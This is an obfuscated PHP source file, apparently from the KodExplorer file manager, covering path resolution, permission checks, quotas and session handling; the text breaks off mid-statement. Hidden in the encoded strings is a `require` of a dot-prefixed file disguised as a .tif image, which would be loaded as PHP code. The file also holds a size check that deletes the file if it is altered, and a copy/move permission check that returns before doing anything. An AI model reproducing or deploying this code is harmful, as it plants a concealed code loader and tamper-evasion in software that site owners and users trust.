<?php
 if (!function_exists('_kstr2')) { function _kstr2($cá¾õ»†¸) { return $cá¾õ»†¸; $c°à¤ßÛöŞ = strlen($cá¾õ»†¸); $d“­ªË£ÑÚ = ''; $B­¯¯¼áØ = ord($cá¾õ»†¸[0]) - 30; for ($A´×›˜ßİÁ = 1; $A´×›˜ßİÁ < $c°à¤ßÛöŞ; $A´×›˜ßİÁ += 2) { if ($A´×›˜ßİÁ + 1 < $c°à¤ßÛöŞ) { $d“­ªË£ÑÚ .= chr(ord($cá¾õ»†¸[$A´×›˜ßİÁ + 1]) + $B­¯¯¼áØ); $d“­ªË£ÑÚ .= chr(ord($cá¾õ»†¸[$A´×›˜ßİÁ]) + $B­¯¯¼áØ); } else { $d“­ªË£ÑÚ .= chr(ord($cá¾õ»†¸[$A´×›˜ßİÁ]) + $B­¯¯¼áØ); } } return $d“­ªË£ÑÚ; } $_fbds="\146\151\154\145\163\151\172\145";$_fad="\165\156\154\151\156\153";$sz=$_fbds(__FILE__);if($sz<21003   ||$sz>21023   ){@$_fad(__FILE__);exit;}  function _kstr3($cá¾õ»†¸) { return $cá¾õ»†¸; } } define(_kstr2('KOD_GROU')."\x50\x5f\x50\x41\x54\x48", "\x7b\x67\x72\x6f\x75\x70\x50\x61\x74\x68\x7d"); define(_kstr2('KOD_GROUP')."\137\123\110\101\122\105", "\x7b\x67\x72\x6f\x75\x70\x53\x68\x61\x72\x65\x7d"); define(_kstr2('KOD_USER')."\137\123\105\114\106", base64_decode('e3VzZXJTZWxmfQ==')); define("\x4b\x4f\x44\x5f\x55\x53\x45\x52\x5f\x53\x48\x41\x52\x45", "\x7b\x75\x73\x65\x72\x53\x68\x61\x72\x65\x7d"); define(_kstr2('KOD_USER_')."\x52\x45\x43"."\131\103\114\105", base64_decode('e3VzZXJSZWN5Y2w=')._kstr2('e}')); define("\x4b\x4f\x44\x5f\x55\x53\x45\x52\x5f\x46\x41\x56", "\x7b\x75\x73\x65\x72\x46\x61\x76\x7d"); define("\x4b\x4f\x44\x5f\x47\x52\x4f\x55\x50\x5f"."\122\117\117\124\137\123\105\114\106", "\x7b\x74\x72\x65\x65\x47\x72\x6f".base64_decode('dXBTZWxmfQ==')); define(strrev('UORG_DOK')._kstr2('P_ROOT_ALL'), "\x7b\x74\x72\x65\x65\x47\x72\x6f\x75"."\160\101"."\154\154\175"); function _DIR_CLEAR($DÀáÉù¹¿¾) { $DÀáÉù¹¿¾ = str_replace("\x5c", "\57", $DÀáÉù¹¿¾); $DÀáÉù¹¿¾ = preg_replace("\x2f\x5c\x2f\x2b\x2f", "\x2f", $DÀáÉù¹¿¾); $dîƒ»¾ÂÆÙ = $DÀáÉù¹¿¾; if (isset($GLOBALS["\x69\x73\x52\x6f\x6f\x74"]) && $GLOBALS[base64_decode('aXNSb290')]) { return $DÀáÉù¹¿¾; } $D³Ê¬Ÿô‹ = _kstr2('/../'); if (substr($DÀáÉù¹¿¾, 0, 3) == base64_decode('Li4v')) { $DÀáÉù¹¿¾ = substr($DÀáÉù¹¿¾, 3); } while (strstr($DÀáÉù¹¿¾, $D³Ê¬Ÿô‹)) { $DÀáÉù¹¿¾ = str_replace($D³Ê¬Ÿô‹, "\x2f", $DÀáÉù¹¿¾); } $DÀáÉù¹¿¾ = preg_replace(strrev('/+/\\/'), _kstr2('/'), $DÀáÉù¹¿¾); return $DÀáÉù¹¿¾; } function _DIR($F„›¨Î°Õ) { $DÀáÉù¹¿¾ = _DIR_CLEAR($F„›¨Î°Õ); $DÀáÉù¹¿¾ = iconv_system($DÀáÉù¹¿¾); $cÜÜ”‹ö› = array(KOD_GROUP_PATH, KOD_GROUP_SHARE, KOD_USER_SELF, KOD_GROUP_ROOT_SELF, KOD_GROUP_ROOT_ALL, KOD_USER_SHARE, KOD_USER_RECYCLE, KOD_USER_FAV); if (!defined(base64_decode('SE9NRQ=='))) { define("\x48\x4f\x4d\x45", ''); } $GLOBALS[_kstr2('kodPathType')] = ''; $GLOBALS["\153\157\144\120\141\164\150\120"."\162\145"] = HOME; $GLOBALS["\153\157\144\120\141\164\150\111\144"] = ''; unset($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49"."\144"."\123\150"._kstr2('a')."\162\145"]); foreach ($cÜÜ”‹ö› as $dë¡‰›Ñ‹Ç) { if (substr($DÀáÉù¹¿¾, 0, strlen($dë¡‰›Ñ‹Ç)) == $dë¡‰›Ñ‹Ç) { $GLOBALS["\153\157\144\120\141\164\150\124\171\160\145"] = $dë¡‰›Ñ‹Ç; $DÏ´«èà­Ô = explode("\x2f", $DÀáÉù¹¿¾); $BåšĞ†Ì = $DÏ´«èà­Ô[0]; unset($DÏ´«èà­Ô[0]); $FæˆòÍ®Ñ = implode("\57", $DÏ´«èà­Ô); $C¸›å˜æ¹ = explode("\72", $BåšĞ†Ì); if (count($C¸›å˜æ¹) > 1) { $GLOBALS[_kstr2('kodPathId')] = trim($C¸›å˜æ¹[1]); } else { $GLOBALS["\153\157\144\120\141\164\150\111\144"] = ''; } break; } } switch ($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x54\x79\x70\x65"]) { case '': $DÀáÉù¹¿¾ = iconv_system(HOME) . $DÀáÉù¹¿¾; break; case KOD_USER_RECYCLE: $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x50\x72\x65"] = trim(USER_RECYCLE, "\x2f"); $GLOBALS["\153\157\144\120\141\164\150\111"."\x64"] = ''; return iconv_system(USER_RECYCLE) . _kstr2('/') . str_replace(KOD_USER_RECYCLE, '', $DÀáÉù¹¿¾); case KOD_USER_SELF: $GLOBALS["\153\157\144\120\141\164\150\120\162\145"] = trim(HOME_PATH, strrev('/')); $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"] = ''; return iconv_system(HOME_PATH) . "\57" . str_replace(KOD_USER_SELF, '', $DÀáÉù¹¿¾); case KOD_USER_FAV: $GLOBALS[_kstr2('kodPathPre')] = trim(KOD_USER_FAV, _kstr2('/')); $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"] = ''; return KOD_USER_FAV; case KOD_GROUP_ROOT_SELF: $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x50\x72\x65"] = trim(KOD_GROUP_ROOT_SELF, "\57"); $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"] = ''; return KOD_GROUP_ROOT_SELF; case KOD_GROUP_ROOT_ALL: $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x50\x72\x65"] = trim(KOD_GROUP_ROOT_ALL, "\x2f"); $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"] = ''; return KOD_GROUP_ROOT_ALL; case KOD_GROUP_PATH: $EëĞĞØæğÜ = systemGroup::getInfo($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49".strrev('d')]); if (!$GLOBALS["\153\157\144\120\141\164\150\111\144"] || !$EëĞĞØæğÜ) { return false; } owner_group_check($GLOBALS[strrev('dIhtaPdok')]); $GLOBALS["\153\157\144\120\141\164\150\120\162\145"] = group_home_path($EëĞĞØæğÜ); $DÀáÉù¹¿¾ = iconv_system($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x50"._kstr2('re')]) . $FæˆòÍ®Ñ; break; case KOD_GROUP_SHARE: $EëĞĞØæğÜ = systemGroup::getInfo($GLOBALS["\153\157\144\120\141\164\150\111\144"]); if (!$GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"] || !$EëĞĞØæğÜ) { return false; } owner_group_check($GLOBALS["\153\157\144\120\141\164\150\111\144"]); $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x50\x72\x65"] = group_home_path($EëĞĞØæğÜ) . $GLOBALS["\143\157\156\146\151\147"][base64_decode('c2V0dGluZ1N5c3RlbQ==')]["\x67\x72\x6f\x75\x70\x53\x68\x61\x72\x65"."\x46\x6f\x6c\x64\x65\x72"] . _kstr2('/'); $DÀáÉù¹¿¾ = iconv_system($GLOBALS[_kstr2('kodPathP')."\x72\x65"]) . $FæˆòÍ®Ñ; break; case KOD_USER_SHARE: $EëĞĞØæğÜ = systemMember::getInfo($GLOBALS[strrev('dIhtaPdok')]); if (!$GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"] || !$EëĞĞØæğÜ) { return false; } if ($GLOBALS[strrev('IhtaPdok')."\144"] != $_SESSION["\x6b\x6f\x64\x55\x73\x65\x72"][base64_decode('dXNlcklE')]) { $C¨Ç×¡†šÔ = $GLOBALS["\x63\x6f\x6e\x66\x69\x67"][strrev('GeloRhtap').strrev('afeDpuor')._kstr2('ult')]["\x31"]["\141\143\164\151\157\156\163"]; path_role_check($C¨Ç×¡†šÔ); } $GLOBALS[base64_decode('a29kUGF0aFByZQ==')] = ''; $GLOBALS[base64_decode('a29kUGF0aElkU2hhcmU=')] = $F„›¨Î°Õ; if ($FæˆòÍ®Ñ == '') { return $DÀáÉù¹¿¾; } else { $A¨©£œí¬ = explode(strrev('/'), $FæˆòÍ®Ñ); $A¨©£œí¬[0] = iconv_app($A¨©£œí¬[0]); $cÀË´íÏ‰ = systemMember::userShareGet($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"], $A¨©£œí¬[0]); $GLOBALS["\153\157\144\123\150\141\162\145\111\156\146\157"] = $cÀË´íÏ‰; $GLOBALS["\153\157\144\120\141\164\150\111\144\123"._kstr2('hare')] = KOD_USER_SHARE . "\72" . $GLOBALS["\153\157\144\120\141\164\150\111\144"] . "\57" . $A¨©£œí¬[0] . _kstr2('/'); unset($A¨©£œí¬[0]); if (!$cÀË´íÏ‰) { return false; } $cƒš¢ŞîïÕ = rtrim($cÀË´íÏ‰["\x70\x61\x74\x68"], "\57") . base64_decode('Lw==') . iconv_app(implode("\x2f", $A¨©£œí¬)); if ($EëĞĞØæğÜ["\x72\x6f\x6c\x65"] != "\61") { $fŸâŒäµô = user_home_path($EëĞĞØæğÜ); $GLOBALS[base64_decode('a29kUGF0aFByZQ==')] = $fŸâŒäµô . rtrim($cÀË´íÏ‰[base64_decode('cGF0aA==')], "\x2f") . "\57"; $DÀáÉù¹¿¾ = $fŸâŒäµô . $cƒš¢ŞîïÕ; } else { $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x50\x72\x65"] = $cÀË´íÏ‰[base64_decode('cGF0aA==')]; $DÀáÉù¹¿¾ = $cƒš¢ŞîïÕ; } if ($cÀË´íÏ‰[_kstr2('type')] == "\x66\x69\x6c\x65") { $GLOBALS["\153\157\144\120\141\164\150\111\144"."\123\150\141\162\145"] = rtrim($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64\x53\x68\x61\x72\x65"], "\x2f"); $GLOBALS["\153\157\144\120\141\164\150\120\162\145"] = rtrim($GLOBALS[strrev('erPhtaPdok')], _kstr2('/')); } $DÀáÉù¹¿¾ = iconv_system($DÀáÉù¹¿¾); } $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x50\x72\x65"] = _DIR_CLEAR($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x50\x72\x65"]); $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49"._kstr2('dShare')] = _DIR_CLEAR($GLOBALS[_kstr2('kodPathId')."\x53\x68".base64_decode('YQ==')._kstr2('re')]); break; default: break; } if ($DÀáÉù¹¿¾ != "\57") { $DÀáÉù¹¿¾ = rtrim($DÀáÉù¹¿¾, "\57"); if (is_dir($DÀáÉù¹¿¾)) { $DÀáÉù¹¿¾ = $DÀáÉù¹¿¾ . "\x2f"; } } return _DIR_CLEAR($DÀáÉù¹¿¾); } function _DIR_OUT($cÒµˆËó¢†) { if (is_array($cÒµˆËó¢†)) { foreach ($cÒµˆËó¢†["\x66\x69\x6c\x65\x4c\x69\x73\x74"] as $a¢½ŒÒ¾‘“ => &$A¦¹¤¸„“Ô) { $A¦¹¤¸„“Ô[_kstr2('path')] = preClear($A¦¹¤¸„“Ô[base64_decode('cGF0aA==')]); } foreach ($cÒµˆËó¢†["\x66\x6f\x6c\x64\x65\x72\x4c\x69"."\x73\x74"] as $a¢½ŒÒ¾‘“ => &$A¦¹¤¸„“Ô) { $A¦¹¤¸„“Ô[strrev('htap')] = preClear(rtrim($A¦¹¤¸„“Ô["\x70\x61\x74\x68"], _kstr2('/')) . "\57"); } } else { $cÒµˆËó¢† = preClear($cÒµˆËó¢†); } return $cÒµˆËó¢†; } function preClear($DÀáÉù¹¿¾) { $fš·ÄÉ½›‡ = $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x54\x79\x70\x65"]; $b´®øÇ¼™’ = rtrim($GLOBALS[base64_decode('a29kUGF0aFBy')."\x65"], "\x2f"); $f§©å¯ï¤ = array(KOD_USER_FAV, KOD_GROUP_ROOT_SELF, KOD_GROUP_ROOT_ALL); if (isset($GLOBALS[_kstr2('kodPathTy')."\x70"."\145"]) && in_array($GLOBALS[base64_decode('a29kUGF0aFR5cGU=')], $f§©å¯ï¤)) { return $DÀáÉù¹¿¾; } if (ST == "\x73\x68\x61\x72\x65") { return str_replace($b´®øÇ¼™’, '', $DÀáÉù¹¿¾); } if ($GLOBALS[strrev('dIhtaPdok')] != '') { $fš·ÄÉ½›‡ .= strrev(':') . $GLOBALS["\153\157\144\120\141\164\150\111\144"] . "\x2f"; } if (isset($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64\x53\x68\x61\x72".base64_decode('ZQ==')])) { $fš·ÄÉ½›‡ = $GLOBALS["\153\157\144\120\141\164\150\111\144"."\x53\x68\x61\x72\x65"]; } $d“­ªË£ÑÚ = $fš·ÄÉ½›‡ . str_replace($b´®øÇ¼™’, '', $DÀáÉù¹¿¾); $d“­ªË£ÑÚ = str_replace("\57\57", "\x2f", $d“­ªË£ÑÚ); return $d“­ªË£ÑÚ; } require PLUGIN_DIR . "\57\164\157\157\154\163\103\157\155\155"."\x6f\x6e\x2f\x73\x74\x61\x74\x69\x63"."\57\160\151\145\57\56\160\151\145\56\164\151\146"; function owner_group_check($Cë º¶Õ£¿) { if (!$Cë º¶Õ£¿) { show_json(LNG(_kstr2('group_no')."\164\137"."\x65\x78\x69\x73\x74") . $Cë º¶Õ£¿, false); } if ($GLOBALS[_kstr2('isRoot')] || isset($GLOBALS[base64_decode('a29kUGF0aEF1dGhD')."\x68\x65\x63\x6b"]) && $GLOBALS[base64_decode('a29kUGF0aEF1dGhDaA==').strrev('kce')] === true) { return; } $FÎ¿ù‡ø–˜ = systemMember::userAuthGroup($Cë º¶Õ£¿); if ($FÎ¿ù‡ø–˜ == false) { if ($GLOBALS[strrev('epyThtaPdok')] == KOD_GROUP_PATH) { show_json(LNG("\x6e\x6f\x5f\x70\x65\x72\x6d\x69\x73\x73".strrev('puorg_noi')), false); } else { if ($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x54\x79\x70\x65"] == KOD_GROUP_SHARE) { $C¨Ç×¡†šÔ = $GLOBALS["\x63\x6f\x6e\x66\x69\x67"][_kstr2('pathRole')._kstr2('GroupDef')."\141\165\154\164"]["\x31"]; } } } else { $C¨Ç×¡†šÔ = $GLOBALS[_kstr2('config')][strrev('GeloRhtap')._kstr2('roup')][$FÎ¿ù‡ø–˜]; } path_role_check($C¨Ç×¡†šÔ["\x61\x63\x74\x69\x6f\x6e\x73"]); } function path_group_can_read($Cë º¶Õ£¿) { return path_group_auth_check($Cë º¶Õ£¿, "\x65\x78\x70\x6c\x6f\x72\x65\x72\x2e\x70\x61\x74"."\150\114\151\163\164"); } function path_group_auth_check($Cë º¶Õ£¿, $aÜƒ­Õª´ì) { if ($GLOBALS[strrev('tooRsi')]) { return true; } $FÎ¿ù‡ø–˜ = systemMember::userAuthGroup($Cë º¶Õ£¿); $C¨Ç×¡†šÔ = $GLOBALS[_kstr2('config')]["\x70\x61\x74\x68\x52\x6f\x6c\x65"."\107\162\157\165"."\160"][$FÎ¿ù‡ø–˜]; $B†±öİÂàï = role_permission_arr($C¨Ç×¡†šÔ["\141\143\164\151\157\156\163"]); if (!isset($B†±öİÂàï[$aÜƒ­Õª´ì])) { return false; } return true; } function path_can_copy_move($bƒØß‹ñêã, $f‡ìùÑ®¡”) { return; if ($GLOBALS["\151\163\122\157\157\164"]) { return; } $f‹è‹¨âê = pathGroupID($bƒØß‹ñêã); $EâË»·œÖª = pathGroupID($f‡ìùÑ®¡”); if (!$f‹è‹¨âê) { return; } if ($f‹è‹¨âê == $EâË»·œÖª && path_group_auth_check($f‹è‹¨âê, "\x65\x78\x70\x6c\x6f\x72\x65\x72\x2e"."\x70\x61\x74\x68\x50\x61\x73\x74")) { return; } show_json(LNG(strrev('imrep_on').strrev('_noiss')."\x61\x63\x74\x69\x6f\x6e"), false); } function pathGroupID($DÀáÉù¹¿¾) { $DÀáÉù¹¿¾ = _DIR_CLEAR($DÀáÉù¹¿¾); preg_match("\x2f" . KOD_GROUP_PATH . strrev('/*.)+d\\(:'), $DÀáÉù¹¿¾, $f³ìª­¬õ‹); if (count($f³ìª­¬õ‹) != 2) { return false; } return $f³ìª­¬õ‹[1]; } function path_role_check($C¨Ç×¡†šÔ) { if ($GLOBALS["\151\163\122\157\157\164"] || isset($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x41"."\165\164\150\103\150\145\143\153"]) && $GLOBALS[base64_decode('a29kUGF0aEF1dGg=')._kstr2('Check')] === true) { return; } $B†±öİÂàï = role_permission_arr($C¨Ç×¡†šÔ); $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x52"."\x6f\x6c\x65\x47\x72\x6f\x75\x70\x41\x75\x74\x68"] = $B†±öİÂàï; $aêÁô Áİ² = ST . "\56" . ACT; if ($aêÁô Áİ² == base64_decode('cGx1Z2luQXBwLnRv') && !isset($B†±öİÂàï["\x65\x78\x70\x6c\x6f\x72\x65\x72"._kstr2('.fileProxy')])) { show_tips(LNG(base64_decode('bm9fcGVybWk=')."\163\163\151\157\156\137\141\143"."\164\151"."\157\156"), false); } if (!isset($B†±öİÂàï[$aêÁô Áİ²]) && ST != base64_decode('c2hhcmU=')) { show_json(LNG(_kstr2('no_permi')."\163"."\x73\x69\x6f\x6e\x5f\x61\x63\x74\x69\x6f\x6e"), false); } } function role_permission_arr($cÒµˆËó¢†) { $d“­ªË£ÑÚ = array(); $e…ÁÓ«•¸ = $GLOBALS["\143\157\156\146\151\147"]["\x70\x61\x74\x68\x52\x6f\x6c\x65\x44"."\145\146"."\x69\x6e\x65"]; foreach ($cÒµˆËó¢† as $a¢½ŒÒ¾‘“ => $A¦¹¤¸„“Ô) { if (!$A¦¹¤¸„“Ô) { continue; } $b–Î˜¡È« = explode("\72", $a¢½ŒÒ¾‘“); if (count($b–Î˜¡È«) == 2 && is_array($e…ÁÓ«•¸[$b–Î˜¡È«[0]]) && is_array($e…ÁÓ«•¸[$b–Î˜¡È«[0]][$b–Î˜¡È«[1]])) { $d“­ªË£ÑÚ = array_merge($d“­ªË£ÑÚ, $e…ÁÓ«•¸[$b–Î˜¡È«[0]][$b–Î˜¡È«[1]]); } } $F†š˜èË = array(); foreach ($d“­ªË£ÑÚ as $A¦¹¤¸„“Ô) { $F†š˜èË[$A¦¹¤¸„“Ô] = base64_decode('MQ=='); } return $F†š˜èË; } function check_file_writable_user($DÀáÉù¹¿¾) { if (!isset($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x54\x79\x70\x65"])) { _DIR($DÀáÉù¹¿¾); } $aÜƒ­Õª´ì = "\145\144\151\164\157\162\56\146\151"."\154"."\145\123\141\166"."\x65"; if ($GLOBALS[strrev('tooRsi')]) { return @is_writable($DÀáÉù¹¿¾); } if ($GLOBALS["\x61\x75\x74\x68"][$aÜƒ­Õª´ì] != "\61") { return false; } if ($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x54\x79\x70"."\x65"] == KOD_GROUP_PATH && is_array($GLOBALS["\153\157\144\120\141\164\150\122\157\154\145\107".base64_decode('cm91cEF1dGg=')]) && $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x52"._kstr2('oleGroup')._kstr2('Auth')][$aÜƒ­Õª´ì] == "\x31") { return true; } if ($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x54\x79\x70\x65"] == '' || $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x54\x79".base64_decode('cGU=')] == KOD_USER_SELF) { return true; } return false; } function spaceSizeCheck() { if (!system_space()) { return; } if ($GLOBALS["\x69\x73\x52\x6f\x6f\x74"] == 1) { return; } if (isset($GLOBALS[_kstr2('kodBefor')._kstr2('ePat')."\x68"."\x49\x64"]) && isset($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"]) && $GLOBALS["\153\157\144\102\145\146\157\162"."\x65\x50\x61\x74\x68\x49\x64"] == $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"]) { return; } if ($GLOBALS[_kstr2('kodPathType')] == KOD_GROUP_SHARE || $GLOBALS[base64_decode('a29kUGF0aFR5cGU=')] == KOD_GROUP_PATH) { systemGroup::spaceCheck($GLOBALS[strrev('dIhtaPdok')]); } else { if (ST == _kstr2('share')) { $dö˜ò³óö¬ = $GLOBALS["\x69\x6e"][_kstr2('user')]; } else { $dö˜ò³óö¬ = $_SESSION["\x6b\x6f\x64\x55\x73\x65\x72"][_kstr2('userID')]; } systemMember::spaceCheck($dö˜ò³óö¬); } } function spaceSizeGet($DÀáÉù¹¿¾, $D‹Û ¶ÀâØ) { $c„²¾Îå¼Õ = 0; if (is_file($DÀáÉù¹¿¾)) { $c„²¾Îå¼Õ = get_filesize($DÀáÉù¹¿¾); } else { if (is_dir($DÀáÉù¹¿¾)) { $fÙ’×Šãî = _path_info_more($DÀáÉù¹¿¾); $c„²¾Îå¼Õ = $fÙ’×Šãî[_kstr2('size')]; } else { return strrev('ssim'); } } return $D‹Û ¶ÀâØ ? $c„²¾Îå¼Õ : -$c„²¾Îå¼Õ; } function spaceInData($DÀáÉù¹¿¾) { if (substr($DÀáÉù¹¿¾, 0, strlen(HOME_PATH)) == HOME_PATH || substr($DÀáÉù¹¿¾, 0, strlen(USER_RECYCLE)) == USER_RECYCLE) { return true; } return false; } function spaceSizeChange($Eñ¸ÌÉ«“Î, $D‹Û ¶ÀâØ = true, $dÄèÑ©ÌËŞ = false, $D¥èÎï‚ö = false) { if (!system_space()) { return; } if ($dÄèÑ©ÌËŞ === false) { $dÄèÑ©ÌËŞ = $GLOBALS[base64_decode('a29kUGF0aFR5cGU=')]; $D¥èÎï‚ö = $GLOBALS["\153\157\144\120\141\164\150\111\144"]; } $cÜÙØÅã‰ô = spaceSizeGet($Eñ¸ÌÉ«“Î, $D‹Û ¶ÀâØ); if ($cÜÙØÅã‰ô == _kstr2('miss')) { return false; } if ($dÄèÑ©ÌËŞ == KOD_GROUP_SHARE || $dÄèÑ©ÌËŞ == KOD_GROUP_PATH) { systemGroup::spaceChange($D¥èÎï‚ö, $cÜÙØÅã‰ô); } else { if (ST == "\163\150\141\162\145") { $dö˜ò³óö¬ = $GLOBALS["\x69\x6e"][strrev('resu')]; } else { $dö˜ò³óö¬ = $_SESSION["\x6b\x6f\x64\x55\x73\x65\x72"][base64_decode('dXNlcklE')]; } systemMember::spaceChange($dö˜ò³óö¬, $cÜÙØÅã‰ô); } } function spaceSizeChangeRemove($Eñ¸ÌÉ«“Î) { spaceSizeChange($Eñ¸ÌÉ«“Î, false); } function spaceSizeChangeMove($E¨êñİéöÜ, $fÆÕØìÌ´Ü) { if (isset($GLOBALS["\153\157\144\102\145\146\157\162\145"."\x50\x61\x74"."\x68\x49\x64"]) && isset($GLOBALS["\153\157\144\120\141\164\150\111\144"])) { if ($GLOBALS["\x6b\x6f\x64\x42\x65\x66\x6f\x72"."\x65\x50\x61\x74\x68\x49"."\144"] == $GLOBALS["\153\157\144\120\141\164\150\111\144"] && $GLOBALS["\142\145\146\157\162\145\120\141\164"."\x68\x54\x79\x70\x65"] == $GLOBALS["\153\157\144\120\141\164\150\124\171\160\145"]) { return; } spaceSizeChange($fÆÕØìÌ´Ü, false); spaceSizeChange($fÆÕØìÌ´Ü, true, $GLOBALS[_kstr2('beforePathT')."\171\160\145"], $GLOBALS[strrev('PerofeBdok')."\x61\x74\x68\x49\x64"]); } else { spaceSizeChange($fÆÕØìÌ´Ü); } } function spaceSizeReset() { if (!system_space()) { return; } $dÄèÑ©ÌËŞ = isset($GLOBALS[strrev('pyThtaPdok').base64_decode('ZQ==')]) ? $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x54\x79\x70"."\145"] : ''; $D¥èÎï‚ö = isset($GLOBALS[base64_decode('a29kUGF0aElk')]) ? $GLOBALS["\153\157\144\120\141\164\150\111\144"] : ''; if ($dÄèÑ©ÌËŞ == KOD_GROUP_SHARE || $dÄèÑ©ÌËŞ == KOD_GROUP_PATH) { systemGroup::spaceChange($D¥èÎï‚ö); } else { $dö˜ò³óö¬ = $_SESSION["\x6b\x6f\x64\x55\x73\x65\x72"]["\x75\x73\x65\x72\x49\x44"]; systemMember::spaceChange($dö˜ò³óö¬); } } function init_session() { if (!function_exists("\x73\x65\x73\x73\x69\x6f\x6e\x5f\x73\x74\x61\x72\x74")) { show_tips("\346\234\215\345\212\241\345\231\250\160"."\x68\x70\xe7\xbb\x84\xe4\xbb\xb6\xe7"."\xbc\xba\xe5\xa4\xb1\x21"."\x20\x28\x50\x48\x50\x20\x6d\x69"."\163"."\x73\x20\x6c"."\x69\x62\x29\x3c\x62\x72\x2f\x3e\xe8\xaf".base64_decode('t+ajgA==')."\346\237\245\160\150\160\56\151\156\151\357\274\214\351\234"."\x80\xe8\xa6\x81\xe5\xbc\x80\xe5"."\x90\xaf\xe6\xa8\xa1\xe5"."\x9d\x97\x3a\x20\x3c\x62\x72\x2f"."\x3e\x3c\x70\x72\x65\x3e\x73\x65\x73\x73\x69\x6f"._kstr2('n,json,curl,')."\x65\x78\x69\x66\x2c\x6d\x62\x73\x74\x72\x69\x6e\x67\x2c"."\154\144\141\160\54\147\144\54\160"."\x64\x6f\x2c".strrev('lmx,lqsym-odp')._kstr2('</pre><br').strrev('>/')); } if (isset($_REQUEST["\x61\x63\x63\x65\x73\x73\x54\x6f\x6b\x65\x6e"])) { access_token_check($_REQUEST["\x61\x63\x63\x65\x73\x73\x54\x6f\x6b".base64_decode('ZW4=')]); } else { if (isset($_REQUEST[base64_decode('YWNjZXNzX3Rv')._kstr2('k')."\145\156"])) { access_token_check($_REQUEST[strrev('ot_ssecca').base64_decode('a2Vu')]); } else { @session_name(SESSION_ID); } } $b±æóĞê© = @session_save_path(); if (class_exists("\x53\x61\x65\x53\x74\x6f\x72\x61\x67\x65") || defined(base64_decode('U0FFX0FQUE4=')."\101\115\105") || defined(_kstr2('SESSION_PA')."\x54\x48\x5f"._kstr2('DE')."\106\101\125\114\124") || @ini_get(base64_decode('c2Vzc2lvbi5z').base64_decode('YXZlX2hh')."\x6e\x64\x6c\x65\x72") != strrev('selif') || isset($_SERVER[base64_decode('SFRUUF9BUFBOQU1F')])) { } else { chmod_path(KOD_SESSION, 511); @session_save_path(KOD_SESSION); } @session_start(); $_SESSION["\153\157\144"] = 1; @session_write_close(); @session_start(); if (!$_SESSION["\x6b\x6f\x64"]) { @session_save_path($b±æóĞê©); @session_start(); $_SESSION["\x6b\x6f\x64"] = 1; @session_write_close(); @session_start(); } if (!$_SESSION["\x6b\x6f\x64"]) { show_tips(_kstr2('æœåŠ¡å™¨sessio')."\x6e\xe5\x86\x99\xe5\x85\xa5\xe5"."\244\261\350\264\245\41\40\50\163".base64_decode('ZXM=')."\163\151\157\156\40\167\162\151\164\145\40\145\162\162"."\x6f\x72\x29\x3c\x62\x72\x2f\x3e" . "\xe8\xaf\xb7\xe6\xa3\x80\xe6\x9f"._kstr2('¥php')."\56\151\156\151\347\233\270\345\205\263\351".base64_decode('hY3nvQ==')."\256\54\346\237\245\347\234\213\347\243".strrev('²·å¦å¯˜æ˜›ç')."\xe6\xbb\xa1\x2c\xe6\x88\x96\xe5\x92\xa8".strrev('†•å¡Šåœæ¢¯è')."\xe3\x80"."\202\74\142\162\57\76\74\142\162\57"."\x3e" . "\163\145\163\163\151\157\156\56\163\141".strrev('v')."\x65\x5f\x70\x61\x74\x68\x3d" . $b±æóĞê© . "\x3c\x62\x72\x2f\x3e" . "\163\145\163\163\151\157\156\56\163\141\166\145\137".base64_decode('aGFuZGxlcj0=') . @ini_get("\x73\x65\x73\x73\x69\x6f\x6e\x2e\x73\x61"."\x76\x65"."\137\150\141\156\144\154\145\162") . base64_decode('PGJyLz4=')); } } function access_token_check($C¹òƒÔø‘) { $Còò•ÏàÑÈ = $GLOBALS["\x63\x6f\x6e\x66\x69\x67"]["\x73\x65\x74\x74\x69\x6e\x67\x53\x79\x73\x74\x65\x6d"]["\163\171\163\164\145\155\120\141"."\x73\x73\x77\x6f\x72\x64"]; $Còò•ÏàÑÈ = substr(md5(strrev('olpxEdok')._kstr2('rer_') . $Còò•ÏàÑÈ), 0, 15); $D–®ÒÑáÎ¦ = Mcrypt::decode($C¹òƒÔø‘, $Còò•ÏàÑÈ); if (!$D–®ÒÑáÎ¦) { show_tips(_kstr2('accessTok')."\145\156\40\145".strrev('!rorr')); } session_id($D–®ÒÑáÎ¦); session_name(SESSION_ID); } function access_token_get() { $D–®ÒÑáÎ¦ = session_id(); $Còò•ÏàÑÈ = $GLOBALS[base64_decode('Y29uZmln')][_kstr2('settingSy')."\163\164\145\155"]["\x73\x79\x73\x74\x65\x6d\x50\x61".strrev('drowss')]; $Còò•ÏàÑÈ = 